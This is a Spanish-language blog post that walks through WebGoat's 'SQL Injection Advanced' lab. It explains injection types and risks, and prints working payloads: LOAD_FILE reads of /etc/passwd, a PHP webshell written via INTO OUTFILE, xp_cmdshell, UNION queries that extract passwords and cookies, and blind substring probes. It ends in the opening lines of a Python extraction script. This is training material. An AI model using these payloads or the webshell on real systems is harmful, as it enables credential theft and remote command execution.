<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="WebGoat - A1 - SQL Injection Advanced" /><meta name="author" content="Christian Gutierrez" /><meta property="og:locale" content="en_US" /><meta name="description" content="Introducción En esta ocasión vamos a trabajar con un laboratorio de SQL Injection - Advanced, en el que realizaremos 2 tipos de ataque SQL injection interesantes y de nivel medio, como lo son: SQL Injection Combined (básica) Blind SQL Injection (básica)" /><meta property="og:description" content="Introducción En esta ocasión vamos a trabajar con un laboratorio de SQL Injection - Advanced, en el que realizaremos 2 tipos de ataque SQL injection interesantes y de nivel medio, como lo son: SQL Injection Combined (básica) Blind SQL Injection (básica)" /><link rel="canonical" href="https://csl-labs.github.io/posts/webgoat-a1-sql-injection/" /><meta property="og:url" content="https://csl-labs.github.io/posts/webgoat-a1-sql-injection/" /><meta property="og:site_name" content="CSL" /><meta property="og:image" content="https://csl-labs.github.io/assets/webgoat/A1/1_sql_injection/portada.PNG" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-03-10T14:10:00-05:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://csl-labs.github.io/assets/webgoat/A1/1_sql_injection/portada.PNG" /><meta property="twitter:title" content="WebGoat - A1 - SQL Injection Advanced" /><meta name="twitter:site" content="@CsLcol" /><meta name="twitter:creator" content="@Christian Gutierrez" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"image":"https://csl-labs.github.io/assets/webgoat/A1/1_sql_injection/portada.PNG","description":"Introducción En esta ocasión vamos a trabajar con un laboratorio de SQL Injection - Advanced, en el que realizaremos 2 tipos de ataque SQL injection interesantes y de nivel medio, como lo son: SQL Injection Combined (básica) Blind SQL Injection (básica)","mainEntityOfPage":{"@type":"WebPage","@id":"https://csl-labs.github.io/posts/webgoat-a1-sql-injection/"},"@type":"BlogPosting","url":"https://csl-labs.github.io/posts/webgoat-a1-sql-injection/","headline":"WebGoat - A1 - SQL Injection Advanced","dateModified":"2021-03-10T14:10:00-05:00","datePublished":"2021-03-10T14:10:00-05:00","author":{"@type":"Person","name":"Christian Gutierrez"},"@context":"https://schema.org"}</script><title>WebGoat - A1 - SQL Injection Advanced | CSL</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/base/logoCSL.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">CSL</a></div><div class="site-subtitle font-italic">WriteUps, HackTheBox, CTF's, CheatSheet, Wargames & more...</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIAS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVO</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>NOSOTROS</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/csl-labs" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/CsLcol" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['csl','csl.com.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Publicaciones </a> </span> <span>WebGoat - A1 - SQL Injection Advanced</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Buscador..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>WebGoat - A1 - SQL Injection Advanced</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Wed, Mar 10, 2021, 2:10 PM -0500" > Mar 10 <i class="unloaded">2021-03-10T14:10:00-05:00</i> </span> by <span class="author"> Christian Gutierrez </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/portada.PNG" class="post-preview-img"><h2 id="introducción">Introducción</h2><p>En esta ocasión vamos a trabajar con un laboratorio de <strong>SQL Injection - Advanced</strong>, en el que realizaremos 2 tipos de ataque <strong>SQL injection</strong> interesantes y de nivel medio, como lo son:</p><ul><li>SQL Injection Combined (básica)<li>Blind SQL Injection (básica)</ul><p>Estos ataques nos permitirán trabajar en la lógica que se debe implementar al momento de explotar una vulnerabilidad de <strong>SQL Injection</strong>, veremos el cómo por medio de distintos comportamientos y errores, se puede perfilar y afinar nuestro payload, al mismo tiempo que se puede automatizar, logrando la extracción de información interna de la <strong>BD</strong>.</p><h2 id="sql-injection">SQL Injection</h2><p>De forma general podemos definir la vulnerabilidad de <strong>SQL Injection</strong>, como la posibilidad de inyectar instrucciones <strong>SQL</strong> especialmente diseñadas para <strong>alterar la intención o proposito de las consultas (querys)</strong> predefinidas por el aplicativo, así pues, lo que inicialmente es una consulta <strong>SQL</strong> que realiza la busqueda de un usuario en la <strong>BD</strong>, al no poseer controles de seguridad adecuados, un atacante puede alterarla y convertirla en consultas a otras tablas internas, o realizar acciones de edición y eliminación, entre otras.</p><p>Dependiendo el tipo de base de datos a la cual se le esten realizando las consultas desde el aplicativo vulnerable, las intrucciones y payloads que se inyectan pueden cambiar, esto debido a ciertas particularidades de cada motor de <strong>BD</strong> (Mysql, Oracle, MSSQL, etc), además existen distintos tipos de explotación que son circunstanciales, por lo que podemos categorizar los modos de explotación en las siguientes secciones:</p><ul><li>Error-based SQLi<li>In-band SQLi (Classic SQLi)<li>Union-based SQLi<li>Inferential SQLi (Blind SQLi)<li>Boolean-based (content-based) Blind SQLi<li>Time-based Blind SQLi<li>Otras…</ul><h2 id="riesgos-de-seguridad">Riesgos de seguridad</h2><p>Esta es una de la vulnerabilidades de mayor impacto, debido a que se encuentra en muchos aplicativos a lo largo y ancho de internet, además del hecho de que es la puerta de entrada para otro tipo de explotaciones que en conjunto permitirían el compromiso del servidor, y hasta de otros activos internos.</p><h3 id="consulta-de-información-privada"><strong>Consulta de información privada</strong></h3><p>Uno de los principales riesgos asociados y quizás el más directo consiste en la posibilidad qur tiene un atacante de leer o consultar información de otras tablas en la <strong>Base de Datos</strong> que enlaza el aplicativo vulnerable. Esta lectura de información puede ir desde extraer datos de todos los usuarios del aplicativo, hasta identificar información de configuración almacenada en las <strong>BD</strong>. Es importante tener presente que las bases de datos son el corazón de los aplicativos actuales, ya que es donde se lleva registro de las operaciones y son el insumo principal para todos los servicios y acciones que se consumen día a día.</p><h3 id="edición-de-información"><strong>Edición de información</strong></h3><p>Similar al riesgo anterior, dependendiendo las circunstancias de la explotación del <strong>SQLi</strong> un atacante también puede editar información a nivel de base de datos, afectando así la integridad de todos los procesos que hagan uso de esta información. Pensemos por un momento en un sistema de puntos en el que nuestro registro de puntos actuales esta almacenado en <strong>BD</strong>, además utilizamos los puntos como sistema de cambio para algún servicio interno; si como atacantes logramos la alteración a nivel de <strong>BD</strong> de nuestra cantidad de puntos, para el aplicativo va a ser transparente por que de forma intrínseca confia en la información que esta le retorna.</p><h3 id="lectura-de-archivos-de-os"><strong>Lectura de archivos de O.S</strong></h3><p>Dependiendo de la base de datos y los privilegios que tengamos en nuestra consulta vulnerable, un atacante puede hacer uso de los recursos del sistema para leer información a nivel de <strong>Sistema Operativo</strong>. Las implicaciones de esto pueden ir desde la lectura de archivos de configuración, hasta la recolección del código fuente del aplicativo, lo que eventualmente proporciona más vectores de ataque hacia el aplicativo o quizás la identificación terceros servicios que puedan ser vulnerables.</p><ul><li>Mysql:<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="s1">'/etc/passwd'</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="n">LOAD_FILE</span><span class="p">(</span><span class="mi">0</span><span class="n">x2F6574632F706173737764</span><span class="p">);</span>
</pre></table></code></div></div></ul><h3 id="subir-archivos-maliciosos"><strong>Subir archivos maliciosos</strong></h3><p>Unido al riesgo anterior, bajo las condiciones adecuadas del vector de ataque y los privilegios de la consulta vulnerable, es posible para un atacante escribir archivos a nivel de <strong>Sistema Operativo</strong>, lo que amplia el riesgo a posible sobreescritura de archivos criticos, o la subida de código malicioso como <strong>webShell’s</strong>:</p><ul><li>Mysql:<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="s1">'&lt;? system($_GET[</span><span class="se">\'</span><span class="s1">c</span><span class="se">\'</span><span class="s1">]); ?&gt;'</span> <span class="k">INTO</span> <span class="n">OUTFILE</span> <span class="s1">'/var/www/shell.php'</span><span class="p">;</span> 
</pre></table></code></div></div><p>Esto sube una webshell básica en php por medio de <strong>Mysql</strong>: <code class="language-plaintext highlighter-rouge">http://localhost/shell.php?c=cat%20/etc/passwd</code></p></ul><h3 id="ejecución-remota-de-comandos"><strong>Ejecución remota de comandos</strong></h3><p>Dependiendo del sistema de bases de datos comprometido, es posible hacer uso de múltiples funcionalidades que permiten la ejecución de comando de sistema operativo por medio de consultas <strong>SQL</strong>:</p><ul><li>MSSQL<ul><li>Se debe habilitar el método <a href="https://www.tarlogic.com/en/blog/red-team-tales-0x01/">XP_CMDSHELL</a><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">EXEC</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">xp_cmdshell</span> <span class="s1">'cmd'</span><span class="p">;</span> 
</pre></table></code></div></div></ul></ul><h2 id="laboratorios">Laboratorios</h2><h3 id="sql-injection-advanced---3">SQL Injection Advanced - 3</h3><p>El reto nos indica que existen 2 tablas en la base de datos <code class="language-plaintext highlighter-rouge">user_data</code> y <code class="language-plaintext highlighter-rouge">user_system_data</code>, y nos provee de 2 funcionalidades, una de consulta de información y otra de validación de credenciales:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/01_dos_funcionalidades.png" alt="Formulario Vulnerable" /> <em>Formulario Vulnerable</em></p><p>Vemos por el error o la caracteristica que nos indica la consulta realizada, que la funcionalidad <code class="language-plaintext highlighter-rouge">Get Account Info</code> hace un llamado a la tabla <code class="language-plaintext highlighter-rouge">user_data</code>, sin embargo por los errores, se puede evidenciar una vulnerabilidad básica de <strong>SQL Injection</strong>, donde lo que inyectamos se concatena con la query original.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/02_payload_basico.png" alt="Payload Básico" /> <em>Payload Básico</em></p><p>El mensaje nos indica un error de <strong>malformación</strong> de la consulta debido a que se inyecta <strong>Dave’</strong>, lo que nos permite constatar que lo que inyectemos se esta interpretando a nivel de consulta.</p><p>Vamos a utilizar una técnicas de <code class="language-plaintext highlighter-rouge">UNION SQL</code>, con la cual unimos contenido de la tabla que pertenece a la consulta original con otra tabla, que es de donde queremos extraer la información.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Dave</span><span class="err">’</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">user_system_data</span> <span class="c1">-- </span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/03_mismatch.png" alt="Error UNION" /> <em>Error UNION</em></p><p>El mensaje de error nos señala que es posible realizar el <code class="language-plaintext highlighter-rouge">UNION</code> entre la <code class="language-plaintext highlighter-rouge">tabla user_data</code> y <code class="language-plaintext highlighter-rouge">user_system_data</code>, sin embargo el numero de columnas <strong>NO coincide</strong> entre ambos resultados, por lo que no es posible agrupar la información; esto lo vemos evidenciado de igual manera revisando la estructura de ambas tablas:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/04_estructura_tablas.png" alt="Estructura tablas" /> <em>Estructura tablas</em></p><p>El número de columnas no es igual para ambas, así que podemos forzar la unión del maximo de columnas de las 2 tablas a unir, alterando e incluyendo valores estaticos en el <code class="language-plaintext highlighter-rouge">SELECT</code>:</p><ul><li>Se van agregando parametros nulos al select, hasta que se detecta un máximo de 7 parametros:<div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">Dave</span><span class="err">’</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">user_name</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">user_system_data</span> <span class="c1">-- </span>
<span class="n">Dave</span><span class="err">’</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="n">user_name</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span> <span class="k">FROM</span> <span class="n">user_system_data</span> <span class="c1">-- </span>
</pre></table></code></div></div></ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/05_incompatibles_tipos.png" alt="Error tipos incompatibles" /> <em>Error tipos incompatibles</em></p><p>Ahora el mensaje nos indica que los tipos a unir son incompatibles, por lo que no es posible realizar la unión entre por ejemplo, una string y valor númerico, etc. Esto se puede solucionar indicando en la posiciones algunos tipos de datos dinstintos hasta encontrar la combinación adecuada de acuerdo al orden en que estan estipulados en la estructura de la tabla:</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Dave</span><span class="err">’</span> <span class="k">UNION</span> <span class="k">SELECT</span> <span class="mi">1</span><span class="p">,</span><span class="n">user_name</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="s1">'-'</span><span class="p">,</span><span class="s1">'-'</span><span class="p">,</span><span class="n">cookie</span><span class="p">,</span><span class="mi">1</span> <span class="k">FROM</span> <span class="n">user_system_data</span> <span class="c1">-- </span>
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/06_reto3_solucionado.png" alt="Reto - 3 - solucionado" /> <em>Reto - 3 - solucionado</em></p><p>Como se puede observar, por medio de una <strong>SQL Injectión</strong> se logro la consulta de información que estaba almacenada en una tabla distinta a la query original; utilizando una técnica de concatenación por <code class="language-plaintext highlighter-rouge">UNION</code>, los resultados de la segunda tabla se agregan a los retornados por la consulta inicial.</p><p>Dandole un vistazo un poco más general se puede concluir que las técnicas <code class="language-plaintext highlighter-rouge">UNION</code> permiten consultar todas las tablas de la base de datos, además de que las condiciones se pueden superar fácilmente por medio de prueba y error, o automatizando el proceso de coincidencia de columnas y una posible combinatoria para tratar con los tipos de datos correctos.</p><h3 id="sql-injection-advanced---5">SQL Injection Advanced - 5</h3><p>En este reto vamos a trabajar con una <strong>Blind SQL Injection</strong>, el cual es un escenario en que el applicativo <strong>NO</strong> nos retorna información directa acerca del error ni la información consultada, por tanto es más complicado descubrir la estructura interna y sobre todo, más complicado extraer la información.</p><p>Se nos plantea el escenario de una funcionalidad de consulta de articulos, que tiene como consulta principal lo siguiente:</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">articles</span> <span class="k">WHERE</span> <span class="n">article_id</span> <span class="o">=</span> <span class="mi">4</span>
</pre></table></code></div></div><p>Al inyectar sobre el parametro <code class="language-plaintext highlighter-rouge">[VICTIM]?article=4 AND 1=1</code> esto se concatena con la consulta inicial y es vulnerable a <strong>SQLi</strong>:</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">articles</span> <span class="k">WHERE</span> <span class="n">article_id</span> <span class="o">=</span> <span class="mi">4</span> <span class="k">and</span> <span class="mi">1</span> <span class="o">=</span> <span class="mi">1</span>
</pre></table></code></div></div><p>Sin embargo, el aplicativo <strong>NO</strong> retorna ningún error indicando algún problema con la sintaxis de la consulta, y ni ningún mensaje generico que haga referencia a la base datos. El único comportamiento que se tiene es el siguiente:</p><ul><li><code class="language-plaintext highlighter-rouge">4 AND 1=1</code><ul><li>La aplicación funciona adecuadamente y nos despliega el articulo #4</ul><li><code class="language-plaintext highlighter-rouge">4 AND 1=2</code><ul><li>El aplicativo <strong>NO</strong> despliega el articulo #4.</ul></ul><p>Este comportamiento nos permite considerar que para la primera consulta (<strong>logicamente verdadera</strong>) se esta interpretando lo que inyectamos, y para la segunda consulta ocurre lo mismo solo que la forma lógica siempre va a ser falsa, por lo que <strong>NO</strong> retorna un articulo. Basados en esta conducta sabemos de antemano que nuestros payload se estan interpretando, pero solo podemos hacer preguntas de verdadero o falso para distinguir un comportamiento de forma externa.</p><blockquote><p>¿Con preguntas de verdadero o falso se puede extraer información?</p></blockquote><p>Claro que sí! es más lento, pero sí se puede. Imaginemos un momento los tipos de preguntas de verdadero o falso que se pueden usar para describir físicamente a una persona:</p><ul><li>¿Mide más de 1.70 metros?<li>¿Usa sombrero?<li>¿Usa lentes?<li>¿Tiene ojos de color azul?<li>¿Usa el cabello largo?<li>Etc..</ul><p>Siguiendo con las preguntas anteriores se puede llegar a la descripción exacta de la persona, solo que requiere más tiempo, sin embargo cada respuesta verdadera o falsa nos aporta información para la siguiente pregunta, de esta manera hasta contemplar todas las posibles caracteristicas y llegar a un resultado conciso.</p><p>Este mismo comportamiento se puede lograr a nivel de consulta de base de datos, no a modo de caracteristicas físicas sino mejor aún, sobre la composición o el contenido de algo interno. Ejemplo:</p><ul><li>¿La primera letra del contenido de la columna <strong>password</strong> es igual a ‘<strong>b</strong>’?:<ul><li><code class="language-plaintext highlighter-rouge">?article=4 AND substring(password,1,1) = 'b'</code><li><code class="language-plaintext highlighter-rouge">substring(contenido, inicio, #caracteres) = letra_abecedario</code>.<li>De esta manera, si la respuesta es <strong>falsa</strong> debemos seguir preguntando si es igual a ‘<strong>b</strong>’, sino ‘<strong>c</strong>’, luego ‘<strong>d</strong>’, ‘<strong>e</strong>’, ‘<strong>f</strong>’, etc.. hasta que se obtenga una respuesta verdadera y así sabremos cual es la primera letra del contenido de esa columna.</ul></ul><p>Basados en lo anterior, entendemos que el comportamiento es preguntar <strong>caracter por caracter</strong> y cuando tengamos una respuesta verdadera, continuaremos con la siguiente posición, bastante similar a realizar una fuerza bruta o probar todas las posibles letras para ver cual coincide en dicha posición.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/07_substring.PNG" alt="Iteración con Substring" /> <em>Iteración con Substring</em></p><p>De forma general, iterando entre las posiciones del contenido y preguntando si dicho valor corresponde al de una letra (que también se itera), podemos recopilar la información. Recordemos que estamos haciendo uso de un operador <code class="language-plaintext highlighter-rouge">AND</code>, lo que nos permite definir un filtro para cuando las condiciones se cumplen y otro para cuando la condición <code class="language-plaintext highlighter-rouge">substring</code> es falsa.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/08_filtro_de_condiciones.png" alt="Filtro de respuestas" /> <em>Filtro de respuestas</em></p><p>Cómo se puede observar, tenemos 2 posibles respuestas ante un payload que resulta verdadero o falso. Si la posición y la letra que estamos iterando coincide, el sistema nos retorna:</p><ul><li><strong>Verdadero</strong>: <code class="language-plaintext highlighter-rouge">User {0} already exists please try to register with a different username</code><li><strong>Falso</strong>:- <code class="language-plaintext highlighter-rouge">User --payload-- created, please proceed to the login page</code></ul><p>Además, si revisamos con detenimiento el aplicativo vemos que se podría sacar un tercer mensaje de error en caso de que por ejemplo consultemos una posición que excede el tamaño del registro que queremos extraer:</p><ul><li>Otra: <code class="language-plaintext highlighter-rouge">Sorry the solution is not correct, please try again</code>`</ul><p>Considerando el comportamiento anterior y los filtros que se puede aplicar, se construye un script en python que replique y extraiga la información de la columna <code class="language-plaintext highlighter-rouge">password</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/assets/webgoat/A1/1_sql_injection/09_resultado_blind_sqli.png" alt="Solución al reto" /> <em>Solución al reto</em></p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">url</span> <span class="o">=</span> <span class="s">"http://csl-devsec.westus2.azurecontainer.io:8080/WebGoat/SqlInjectionAdvanced/challenge"</span>
<span class="n">cookie</span> <span class="o">=</span> <span class="s">"TU-COOKIE"</span>
